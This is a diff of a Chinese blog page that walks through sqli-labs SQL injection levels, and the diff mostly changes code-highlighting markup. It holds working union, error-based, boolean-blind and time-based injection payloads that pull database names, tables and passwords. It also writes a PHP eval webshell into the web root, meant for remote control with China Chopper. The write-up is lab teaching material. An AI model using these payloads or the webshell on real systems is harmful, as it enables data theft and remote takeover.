@@ -30,7 +30,7 @@
     <script src="/libs/jquery/jquery.min.js"></script>
 
 <meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Chenluo" type="application/atom+xml">
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+</head>
 
 
 
@@ -457,7 +457,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    6.3k
+                    6.2k
                 </div>
                 
 
@@ -468,6 +468,9 @@
         </div>
         <hr class="clearfix">
 
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
         
 
         
@@ -508,26 +511,22 @@
 <ul>
 <li>查询数据库版本和库名称</li>
 </ul>
-<pre class=" language-sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>version<span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+//要让前边为错“-1”，不让数据库执行前边的语句</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>version<span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">--+//要让前边为错“-1”，不让数据库执行前边的语句</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://user-images.githubusercontent.com/76896357/114821977-f9e3c600-9df3-11eb-95ca-17e5b48cce94.png" alt="image"></p>
 <ul>
 <li>查询表名</li>
 </ul>
-<pre class=" language-sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+//group_concat,查询显示所有结果</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">--+//group_concat,查询显示所有结果</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://user-images.githubusercontent.com/76896357/114822963-690dea00-9df5-11eb-962c-c757254f70e4.png" alt="image"></p>
 <ul>
-<li>查询列名<br>```sql</li>
+<li>查询列名<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=database() and table_name='</span>users' <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ul>
-<p>-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=database() and table_name=’users’ –+</p>
-<pre><code>
-![image](https://user-images.githubusercontent.com/76896357/114823252-d6217f80-9df5-11eb-891e-32999a95568f.png)
-
-* 查询字段名
-```sql
--1&#39; union select 1,2,group_concat(password) from security.users --+
-</code></pre>
+<p><img src="https://user-images.githubusercontent.com/76896357/114823252-d6217f80-9df5-11eb-891e-32999a95568f.png" alt="image"></p>
+<ul>
+<li>查询字段名<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> security<span class="token punctuation">.</span>users <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
 <p><img src="https://user-images.githubusercontent.com/76896357/114823890-ad4dba00-9df6-11eb-85e1-6c065b1812ea.png" alt="image"></p>
 <p>第一关结束！！！</p>
 <h2 id="2-数字型注入"><a href="#2-数字型注入" class="headerlink" title="2. 数字型注入"></a>2. 数字型注入</h2><ul>
@@ -540,30 +539,20 @@
 </ul>
 <p><img src="https://user-images.githubusercontent.com/76896357/114825124-66f95a80-9df8-11eb-9679-eb91c77552e6.png" alt="image"></p>
 <ul>
-<li>查库<br>```sql</li>
+<li>查库<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ul>
-<p>-1 union select 1,2,database() –+</p>
-<pre><code>
-
-
-![image](https://tva1.sinaimg.cn/large/008i3skNly1gq5pih2j9aj30ht0bodgq.jpg)
-
-从这里发现，之后的阶段和第一题几乎一样，除了1后面的‘。。。
-
-不再赘述，下一题，
-
-## 3.报错注入
-
-* 查看注入方式
-
-* ![image](https://user-images.githubusercontent.com/76896357/114825972-71682400-9df9-11eb-880f-b1b9def1e766.png)
-
-在这里，可以看到，过滤的很严，看不出来是哪种方式闭合,但是可以发现，只有在输入‘的时候会报错，因此猜想是单引号的字符型注入
-
-**然而当我再输入的时候查看回显位的时候，这才发现了他的闭合方式，原来是‘)**
-```sql
--1&#39;) union select 1,2,3 --+
-</code></pre>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq5pih2j9aj30ht0bodgq.jpg" alt="image"></p>
+<p>从这里发现，之后的阶段和第一题几乎一样，除了1后面的‘。。。</p>
+<p>不再赘述，下一题，</p>
+<h2 id="3-报错注入"><a href="#3-报错注入" class="headerlink" title="3.报错注入"></a>3.报错注入</h2><ul>
+<li><p>查看注入方式</p>
+</li>
+<li><p><img src="https://user-images.githubusercontent.com/76896357/114825972-71682400-9df9-11eb-880f-b1b9def1e766.png" alt="image"></p>
+</li>
+</ul>
+<p>在这里，可以看到，过滤的很严，看不出来是哪种方式闭合,但是可以发现，只有在输入‘的时候会报错，因此猜想是单引号的字符型注入</p>
+<p><strong>然而当我再输入的时候查看回显位的时候，这才发现了他的闭合方式，原来是‘)</strong></p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/114826417-13880c00-9dfa-11eb-9720-a58460cfc5d2.png" alt="image"></p>
 <p>好了，现在知道闭合方式，那么继续查看回显</p>
 <p><img src="https://user-images.githubusercontent.com/76896357/114826682-5cd85b80-9dfa-11eb-8aa5-8290364a0156.png" alt="image"></p>
@@ -577,65 +566,51 @@
 <p><img src="https://user-images.githubusercontent.com/76896357/114827042-cb1d1e00-9dfa-11eb-82e8-3a47c7c01055.png" alt="image"></p>
 <p>根据报错显示这道题的闭合方式应该是“)</p>
 <ul>
-<li>查询回显位<br>```sql</li>
+<li>查询回显位<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">--+//前面一定要是错的</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ul>
-<p>-1”) union select 1,2,3 –+//前面一定要是错的</p>
-<pre><code>
-![image](https://user-images.githubusercontent.com/76896357/114827286-10d9e680-9dfb-11eb-9974-6690deabc7f8.png)
-
-* 查库
-```sql
--1&quot;) union select 1,2,database() --+
-</code></pre>
+<p><img src="https://user-images.githubusercontent.com/76896357/114827286-10d9e680-9dfb-11eb-9974-6690deabc7f8.png" alt="image"></p>
+<ul>
+<li>查库<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
 <p><img src="https://user-images.githubusercontent.com/76896357/114827516-5d252680-9dfb-11eb-8f6d-1f136fe29b7d.png" alt="image"></p>
 <p>显然和第一关一样，不再赘述，过</p>
 <h2 id="5-报错注入"><a href="#5-报错注入" class="headerlink" title="5. 报错注入"></a>5. 报错注入</h2><ul>
 <li>在这里，继续查看他的闭合方式以及注入类型</li>
 </ul>
-<pre class=" language-sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment" spellcheck="true">--+</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://user-images.githubusercontent.com/76896357/114827854-c442db00-9dfb-11eb-8a3d-c7972e860903.png" alt="image"></p>
 <p>通过报错发现，他的闭合方式是‘而且是字符型注入</p>
 <ul>
-<li>查看他有没有回显<br>```sql</li>
+<li>查看他有没有回显<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ul>
-<p>-1’ union select 1,2,3 –+</p>
-<pre><code>
-![image](https://user-images.githubusercontent.com/76896357/114828080-0ff58480-9dfc-11eb-89f3-8165d4594b2c.png)
+<p><img src="https://user-images.githubusercontent.com/76896357/114828080-0ff58480-9dfc-11eb-89f3-8165d4594b2c.png" alt="image"></p>
+<p><strong>完了，没有回显了，那么我们就想到报错注入</strong></p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-__完了，没有回显了，那么我们就想到报错注入__
-
-```sql
--1&#39; union select 1,2,3,4 --+
-</code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/114828373-6662c300-9dfc-11eb-9b32-ac5d96f1faef.png" alt="image"></p>
 <p><strong>很显然他是会返回错误信息的</strong></p>
 <p>因此套用报错注入的公式</p>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select count(*),1, concat('</span><span class="token operator">~</span><span class="token string">',(select database()),'</span><span class="token operator">~</span>'<span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token number">a</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span><span class="token comment" spellcheck="true">--+</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select count(*),1, concat('</span><span class="token operator">~</span><span class="token string">',(select database()),'</span><span class="token operator">~</span>'<span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> a<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://user-images.githubusercontent.com/76896357/114830420-c195b500-9dfe-11eb-9751-5910d2262d7e.png" alt="image"></p>
 <ul>
 <li><p>查表：</p>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select count(*),1, concat('</span><span class="token operator">~</span><span class="token string">',(select table_name from information_schema.tables where table_schema=database() limit 3,1),'</span><span class="token operator">~</span>'<span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token number">a</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span> <span class="token comment" spellcheck="true">--+//同时带有随机性</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select count(*),1, concat('</span><span class="token operator">~</span><span class="token string">',(select table_name from information_schema.tables where table_schema=database() limit 3,1),'</span><span class="token operator">~</span>'<span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> a <span class="token comment">--+//同时带有随机性</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/114836284-12101100-9e05-11eb-8a85-450af27666ee.png" alt="image"></p>
 </li>
 <li><p>查列：</p>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select count(*),1, concat('</span><span class="token operator">~</span><span class="token string">',(select column_name from information_schema.columns where table_schema=database() and table_name='</span>users<span class="token string">' limit 2,1),'</span><span class="token operator">~</span>'<span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token number">a</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span> <span class="token comment" spellcheck="true">--+</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select count(*),1, concat('</span><span class="token operator">~</span><span class="token string">',(select column_name from information_schema.columns where table_schema=database() and table_name='</span>users<span class="token string">' limit 2,1),'</span><span class="token operator">~</span>'<span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> a <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/114838451-4edd0780-9e07-11eb-8841-55c6c4a4e235.png" alt="image"></p>
 </li>
 <li><p>查字段：</p>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select count(*),1, concat('</span><span class="token operator">~</span><span class="token string">',(select password from security.users limit 1,1),'</span><span class="token operator">~</span>'<span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token number">a</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span> <span class="token comment" spellcheck="true">--+</span>
-</code></pre>
-</li>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select count(*),1, concat('</span><span class="token operator">~</span><span class="token string">',(select password from security.users limit 1,1),'</span><span class="token operator">~</span>'<span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> a <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ul>
 <p><img src="https://user-images.githubusercontent.com/76896357/114838875-ba26d980-9e07-11eb-9917-1745abca7181.png" alt="image"></p>
 <p><strong>建议：背下公式，concat里面的内容是要修改的查询语句</strong>//存在一定的概率问题，当出现YOU are in。。。时，多试几次</p>
 <h2 id="6-“报错注入"><a href="#6-“报错注入" class="headerlink" title="6. “报错注入"></a>6. “报错注入</h2><p>看到这就感觉和第五题应该差不多</p>
 <ul>
-<li>查看他的闭合方式<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token comment" spellcheck="true">--+ //1=1时不会报错，1=2时报错</span>
-</code></pre>
+<li>查看他的闭合方式<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token comment">--+ //1=1时不会报错，1=2时报错</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <img src="https://user-images.githubusercontent.com/76896357/114840558-7fbe3c00-9e09-11eb-8126-f3ce73b2abfb.png" alt="image"></li>
 </ul>
 <p>可以看出他的闭合方式是双引号</p>
@@ -643,8 +618,7 @@ __完了，没有回显了，那么我们就想到报错注入__
 <li><p>其实在这里之前我先输如的是‘和” 发现’的时候会返回Yuo are in。。。“的时候发现没有回显，就可以知道他的闭合方式是”“</p>
 </li>
 <li><p>查库：</p>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select count(*),1, concat('</span><span class="token operator">~</span><span class="token string">',(select database()),'</span><span class="token operator">~</span>'<span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token number">a</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span><span class="token comment" spellcheck="true">--+</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select count(*),1, concat('</span><span class="token operator">~</span><span class="token string">',(select database()),'</span><span class="token operator">~</span>'<span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> a<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/114841918-edb73300-9e0a-11eb-9f3c-ba9ec6ae63df.png" alt="image"></p>
 </li>
 </ul>
@@ -658,8 +632,7 @@ __完了，没有回显了，那么我们就想到报错注入__
 <p><img src="https://user-images.githubusercontent.com/76896357/114844888-d2015c00-9e0d-11eb-91c0-89d14b82a8b6.png" alt="image"></p>
 <p>所以，闭合方式是‘））</p>
 <ul>
-<li>直接写入<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">')) union select 1,2,'</span><span class="token operator">&lt;</span>?php <span class="token variable">@eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>' <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">"D:\\phpstudy_pro\\WWW\\q.php"</span> <span class="token comment" spellcheck="true">--+</span>
-</code></pre>
+<li>直接写入<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">')) union select 1,2,'</span><span class="token operator">&lt;</span>?php <span class="token variable">@eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>' <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">"D:\\phpstudy_pro\\WWW\\q.php"</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 注意是否有写入文件的权限</li>
 </ul>
 <p>之后用菜刀等链接</p>
@@ -667,23 +640,19 @@ __完了，没有回显了，那么我们就想到报错注入__
 <li><p>经判断，没有回显</p>
 </li>
 <li><p>查看闭合方式</p>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment" spellcheck="true">--+</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/114853505-6ff92480-9e16-11eb-9d8a-5a3ad5e2362f.png" alt="image"></p>
 </li>
 </ul>
 <p>确定是‘的闭合方式</p>
 <ul>
 <li><p>判断是不是报错注入</p>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token comment" spellcheck="true">--+</span>
-</code></pre>
-</li>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li><p>很显然不是，而是bool盲注，只显示两种情况</p>
 </li>
 </ul>
 <p>因此，就用猜测的方法</p>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr(database(),1,1)='</span>s' <span class="token comment" spellcheck="true">--+</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr(database(),1,1)='</span>s' <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/114865853-704cec00-9e25-11eb-91d1-a1c15fed4458.png" alt="image"></p>
 <p>这里可以借助bp，进行爆破</p>
 <p>还可以手工<br>类似于：</p>
@@ -702,15 +671,13 @@ __完了，没有回显了，那么我们就想到报错注入__
 <p><img src="https://user-images.githubusercontent.com/76896357/114875833-46e58d80-9e30-11eb-9175-7dff2c4758b2.png" alt="image"></p>
 <p>由此可知，库名是security</p>
 <ul>
-<li>查表：<pre><code>?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#39;r&#39; --+
-</code></pre>
+<li>查表：<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&#39; and left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1)&#x3D;&#39;r&#39; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <img src="https://user-images.githubusercontent.com/76896357/114887359-f6bff880-9e3a-11eb-839c-1356d722d19c.png" alt="image"></li>
 </ul>
 <p>介绍一种方法:<br>利用bp，进行一字母一个字母爆破</p>
 <p><img src="https://user-images.githubusercontent.com/76896357/114896206-b795a580-9e42-11eb-8bb7-c932b9fcb159.png" alt="image"></p>
 <ul>
-<li>查字段<pre><code>?id=1&#39; and left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),1)=&#39;p&#39; --+
-</code></pre>
+<li>查字段<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&#39; and left((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1,1),1)&#x3D;&#39;p&#39; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 自己手动改变第一个1和第3个1，让bp去爆破字母</li>
 </ul>
 <p><img src="https://user-images.githubusercontent.com/76896357/114899272-6804a900-9e45-11eb-81ce-139b06a793a3.png" alt="image"></p>
@@ -723,8 +690,7 @@ __完了，没有回显了，那么我们就想到报错注入__
 <li>发现无论输入什么，就只有那一句话，这就说明，没有回显，没有报错，不能布尔盲注</li>
 </ul>
 <p>那么就只能，利用一下，绝招(绝境用的招数)，延时注入</p>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/114900360-612a6600-9e46-11eb-90e3-bd246dea60c8.png" alt="image"></p>
 <p>还真睡了5秒</p>
 <p>就这样，通过判断真假来让其睡眠</p>
@@ -732,33 +698,32 @@ __完了，没有回显了，那么我们就想到报错注入__
 <li>查库</li>
 </ul>
 <p>判断库的长度</p>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">5</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+</span>
-</code></pre>
